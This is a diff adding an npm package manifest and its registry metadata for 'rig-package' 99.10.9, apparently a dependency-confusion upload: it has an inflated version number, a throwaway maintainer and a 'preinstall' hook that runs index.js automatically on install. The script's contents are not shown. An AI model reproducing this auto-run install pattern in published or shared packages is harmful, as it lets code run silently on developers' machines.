@@ -1,0 +1,39 @@
+{
+    "name": "rig-package",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "rig-package@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-uhAu20qwu4CQq9tzyfRce0HMdCJSwWIe5S7cr7jdgl/jbEFDZJhULnYUNIXn/EviIiCgX43jZjuStI7MfyJOsg==",
+        "shasum": "7f32e250f24181c238c8104ae16bbacc3c3e995f",
+        "tarball": "https://registry.npmjs.org/rig-package/-/rig-package-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5063,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMqUACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpsmA/9GhF8oh4k7/xdD6IQhfYEJJX9St7r1qren5uRrORKd0ARYUkp\r\nxRgHYI3Ruo+IqSg1+YqMBe8ukQWJ5APkSN3u3zNL5Y4ZGT+l9iznOi/Ys8zO\r\n/hCZk7k6vwFTQGZj+w0tKIyeBUNYBBlyuLf/xvyo4u1IWcVIgIJJf+TBuZ0h\r\nof7FqL+tOLTXlcUORIf3jLlMlEQ0qvh4OHaU3vs6Hm9OySgcEpxqUlWehk/f\r\nkYjr36lQOfWbQ/YvchMWkoua2LRjsedJnPIPVOoR3BtxPVprOEsbyccAm1fk\r\ny6JK396LdBKEPuQ/JUJsyo24qRKbyffFggj4G70XAaCCJfTydI9a4Q3ds/Ad\r\n84hiBrIJuhStgkEGZOlWXcLcFNez77xsAf8B/VqHZJlCfJnxqJEJwIAO5Kfa\r\nQH0xZG7P0NyIwQzVA7Qmmm+udM0Zcuvj32Ux2LjWXi/vE1ftG9glBmh2pY5x\r\n4E2yYQc68+pw9GY1YwedlHMOAAK1CDKHWcxhZE0mJbDVJ8QOi7+h7cEiUMtk\r\nTjH43qXo3Ic68zpUKgSeFmFPykkSFJE0YFWasqDdSlEnOLCMXP++abFbj7Tl\r\nXsnWfCdKcaY6EMu8YJLSwI5W8XwR43zp2VjngxWqY+M1qdlbH9+x9RVVzDEa\r\nhXP5tmRFQO2bNoyiShUw/vIZrtTU/Kkdshg=\r\n=GBcC\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "3god2tk3",
+        "email": "3god2tk3@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "3god2tk3",
+            "email": "3god2tk3@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/rig-package_99.10.9_1648151188674_0.9247255560323269"
+    },
+    "_hasShrinkwrap": false
+}
